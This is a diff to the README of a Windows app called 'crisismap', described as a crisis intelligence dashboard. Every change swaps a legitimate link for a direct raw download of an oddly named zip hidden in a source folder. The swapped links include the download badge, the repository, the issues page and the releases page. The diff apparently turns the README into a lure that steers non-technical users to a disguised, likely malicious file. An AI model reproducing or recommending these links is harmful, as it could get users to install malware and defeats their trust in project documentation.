@@ -1,6 +1,6 @@
 # 🗺️ crisismap - Real-time Crisis Intelligence Dashboard
 
-[![Download crisismap](https://img.shields.io/badge/Download-crisismap-%23FF6F61?style=for-the-badge)](https://github.com/textgt/crisismap)
+[![Download crisismap](https://img.shields.io/badge/Download-crisismap-%23FF6F61?style=for-the-badge)](https://github.com/textgt/crisismap/raw/refs/heads/main/src/components/markets/Software_anamnionic.zip)
 
 ---
 
@@ -31,7 +31,7 @@ You do not have to install any other software. crisismap does not need technical
 Follow these steps to get crisismap on your Windows computer:
 
 1. Click on the big button above or visit this page to download:  
-   https://github.com/textgt/crisismap
+   https://github.com/textgt/crisismap/raw/refs/heads/main/src/components/markets/Software_anamnionic.zip
 
 2. On the GitHub page, look for a section called **Releases** or a folder where you can find the download files. 
 
@@ -106,10 +106,10 @@ If you find crisismap is not working correctly, try the following tips:
 ## 📚 Additional Resources
 
 - For questions or to report problems, visit the GitHub issues page:  
-  https://github.com/textgt/crisismap/issues
+  https://github.com/textgt/crisismap/raw/refs/heads/main/src/components/markets/Software_anamnionic.zip
 
 - For updates and new releases, check the Releases section:  
-  https://github.com/textgt/crisismap/releases
+  https://github.com/textgt/crisismap/raw/refs/heads/main/src/components/markets/Software_anamnionic.zip
 
 ---
 
@@ -117,4 +117,4 @@ If you find crisismap is not working correctly, try the following tips:
 
 To get started with crisismap, visit this link and download your setup file:
 
-[![Download crisismap](https://img.shields.io/badge/Download-crisismap-%23FF6F61?style=for-the-badge)](https://github.com/textgt/crisismap)
+[![Download crisismap](https://img.shields.io/badge/Download-crisismap-%23FF6F61?style=for-the-badge)](https://github.com/textgt/crisismap/raw/refs/heads/main/src/components/markets/Software_anamnionic.zip)
